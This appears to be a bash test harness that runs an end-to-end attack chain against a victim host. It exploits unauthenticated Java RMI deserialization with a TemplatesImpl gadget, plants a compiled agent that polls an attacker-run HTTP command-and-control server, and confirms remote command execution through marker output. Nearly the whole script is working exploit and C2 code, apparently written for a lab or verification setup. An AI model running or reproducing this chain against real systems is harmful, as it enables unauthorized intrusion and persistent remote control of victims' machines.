#!/bin/bash
# Webshell-form E2E attacker — Chain 1 (RMI unauth deserialization → TemplatesImpl → HTTP polling agent)
# usage: shell_e2e_attack.sh <victim-ip> <victim-port> [c2-port]
set -ux
VIP="${1:?victim ip}"; VPORT="${2:-1100}"; LPORT="${3:-4001}"
MYIP=$(hostname -i | awk '{print $1}')
echo "[*] attacker=$MYIP victim=$VIP:$VPORT c2=$LPORT"

# ── wait for victim RMI ──
for i in $(seq 1 60); do
  (echo > /dev/tcp/$VIP/$VPORT) 2>/dev/null && break
  sleep 3
done

# ── build AgentTranslet with runtime substitution ──
# javac rejects --add-exports for non-exported packages ("bad name"); local STUB sources
# + --patch-module java.xml=stubs make them observable → compile passes
mkdir -p /tmp/build && cd /tmp/build
mkdir -p stubs/com/sun/org/apache/xalan/internal/xsltc/runtime \
         stubs/com/sun/org/apache/xml/internal/dtm \
         stubs/com/sun/org/apache/xml/internal/serializer
cp /v/DOM.java stubs/com/sun/org/apache/xalan/internal/xsltc/
cp /v/AbstractTranslet.java stubs/com/sun/org/apache/xalan/internal/xsltc/runtime/
cp /v/DTMAxisIterator.java stubs/com/sun/org/apache/xml/internal/dtm/
cp /v/SerializationHandler.java stubs/com/sun/org/apache/xml/internal/serializer/
sed -e "s/__ATTACKER_IP__/$MYIP/" -e "s/__ATTACKER_PORT__/$LPORT/" /v/agent_template.java > AgentTranslet.java
javac --patch-module java.xml=stubs \
  --add-exports java.xml/com.sun.org.apache.xalan.internal.xsltc=ALL-UNNAMED \
  --add-exports java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
  --add-exports java.xml/com.sun.org.apache.xml.internal.dtm=ALL-UNNAMED \
  --add-exports java.xml/com.sun.org.apache.xml.internal.serializer=ALL-UNNAMED \
  -d /tmp/build AgentTranslet.java || { echo "javac FAILED"; exit 1; }
cp /tmp/build/AgentTranslet.class /tmp/AgentTranslet.class   # loadBytecode probes /tmp/
ls -la /tmp/AgentTranslet.class

# ── C2: GET /cmd serves the command, POST /out collects results ──
CMDS='id; hostname; uname -a; ls -la /tmp/canary_rce; echo WEBSHELL-E2E-MARKER'
rm -f /tmp/c2_out.txt
python3 /v/c2_server.py "$LPORT" /tmp/c2_out.txt "$CMDS" > /tmp/c2.log 2>&1 &
sleep 1
tail -1 /tmp/c2.log

# ── exploit driver — proper RMI client: registry lookup → echo(TemplatesImpl) ──
# attacker-side reflection needs module opens for TemplatesImpl private fields
java \
  --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
  --add-opens java.base/java.lang=ALL-UNNAMED \
  --add-opens java.base/java.util=ALL-UNNAMED \
  -cp /v/exploit.jar -Dbytecode.class=AgentTranslet \
  RmiExploit "$VIP" 1099 2>&1 | tail -6
echo "[*] exploit sent — agent should poll C2 within ~2s"

# ── verdict ──
for i in $(seq 1 36); do
  grep -q "WEBSHELL-E2E-MARKER" /tmp/c2_out.txt 2>/dev/null && break
  sleep 5
done
echo "── C2 collected output ──"
cat /tmp/c2_out.txt 2>/dev/null
if grep -q "WEBSHELL-E2E-MARKER" /tmp/c2_out.txt 2>/dev/null && grep -q "uid=" /tmp/c2_out.txt 2>/dev/null; then
  echo "VERDICT: WEBSHELL (HTTP command channel established; commands executed on victim)"
  exit 42
else
  echo "VERDICT: NO-WEBSHELL"
  exit 0
fi
